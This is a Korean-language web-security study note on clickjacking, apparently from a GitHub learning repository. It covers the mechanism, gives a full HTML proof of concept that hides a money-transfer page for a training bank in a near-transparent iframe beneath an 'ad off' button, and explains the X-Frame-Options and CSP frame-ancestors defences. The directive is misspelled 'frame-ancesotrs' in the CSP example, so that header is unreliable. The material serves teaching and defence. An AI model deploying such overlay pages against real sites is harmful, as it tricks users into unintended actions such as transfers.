# Click Hijacking

## 목차

1. [개요](#개요)
2. [원리](#원리)
3. [예문](#예문)
4. [해결방안](#해결방안)

## 개요

`Click Jacking`(클릭 재킹)은 웹 브라우저 화면에
출력되는 내용에 HTML, CSS, JS 등과 같이 화면 출력에
영향을 미치는 요소들을 이용하여 사용자의 눈을 속여
사용자의 클릭을 유도하는 공격방법이다.


## 원리

아래와 같이 외부 페이지 리소스를
불러올 수 있는 태그 엘리먼트를 사용합니다. 
```html
    <frame>
    <iframe>
    <object>
    <embed>
    <applet>
```

사용자의 클릭을 유도하는 페이지를 구성 후,
그 페이지 위에 iframe등의 태그로
누르게 할 페이지를 로드합니다.
그리고 CSS `opacity`(투명도 조절)과 같이
사용자의 눈에 보이지 않도록 숨겨 놓는 방법을
이용하여 공격을 할 수 있습니다.

> 사용자가 보는 페이지와
> 실제로 누르는 곳에 차이가 있는 이유는
> **iframe**태그가 웹 브라우저 상에서는
> 더 위에 위치해 있기에
> 클릭 시 동작하는 원리이다.

## 예문

```html
    <!doctype html>
    <html>
        <head>
            <meta charset='utf-8'>
        </head>
        <body>
            <div id="wrapper">
                <div id="my-div">
                    <button id='my-button'>광고 끄기</button>
                    <img src="theori_tv.jpg" id='my-img'>
                </div>
                <iframe src="https://bank.dreamhack.io/send_money_preview?to=hacker&amount=10000" id="my-frame"></iframe>
            </div>
            <style>
            button { width: 100px; height: 30px; }
            * { margin: 0; padding: 0; }
            #wrapper {
                position: absolute;
                top: calc(50% - 250px);
                left: calc(50% - 250px);
            }
            #my-div {
                position: absolute;
                z-index: -9;
                top: 118px;
                left: 10px;
            }
            #my-img {
                border: 1px solid blue;
                width: 600px;
                position: absolute;
                left: 0;
                z-index: -10;
            }
            #my-button {
                width: 100px;
                height: 100px;
            }
            #my-frame {
                border: 1px solid red;
                width: 300px;
                height: 300px;
                opacity: 0.1;
            }
            </style>
        </body>
    </html>
```
## 해결방안

`Click Hijacking`의 해결방안은
아래의 두가지가 있습니다.

1. [**X-Frame-Options**](#X-Frame-Options)
2. [**frame-ancestors**](#frame-ancestors)

이 두 설정 모두 부모 페이지의 URL을
제한하는 방식으로 클릭재킹을 방어합니다.

### X-Frame-Options

HTTP 응답 헤더를 통해
`DENY`와 `SAMEORIGIN` 두개의 값을
설정 가능합니다.

|값|내용|
|:--|:--|
|DENY|부모 페이지 URL 상관없이 모두 차단|
|SAMEORIGIN|부모 페이지 URL이 Same Origin이라면 허용|

**예시**(모두 차단하는 방법)

    X-Frame-Options: DENY

### frame-ancestors
**CSP**(Content Security Policy)의 
`frame-ancesotrs` 지시어를 통해
값을 설정할 수 있습니다.
`frame-ancestors` 지시어는 CSP를 
HTTP 응답 헤더를 통해 설정해야하며
\<meta>태그로는 설정할 수 없습니다.

|값|내용|
|:--|:--|
|'none'|X-Frame-Options DENY와 동일|
|'self'|X-Frame-Options SAMEORIGIN과 동일|
|http://, https://|scheme가 같으면 모두 허용|
|*.dreamhack.io, dreamhack.io, https://dreamhack.io|host나 scheme+host가 같으면 모두 허용, 와일드카드(*)를 사용할 수 있음|

**예시** (http://dreamhack.io와 google.com의 모든 서브 도메인 그리고 https://scheme를 모두 허용)

    Content-Security-Policy:
    frame-ancesotrs http://dreamhack.io
    *.google.com
    https://
-----
대부분의 브라우저에서 호환성과 보안문제로 
모든 parent URL들을 검사하지만
`X-Frame-Options`보다는 최신 기술인
CSP `frame-ancestors`를 사용하는것을 권고한다.

**[Home](https://github.com/sunrabbit123/Learn_Web_Security)**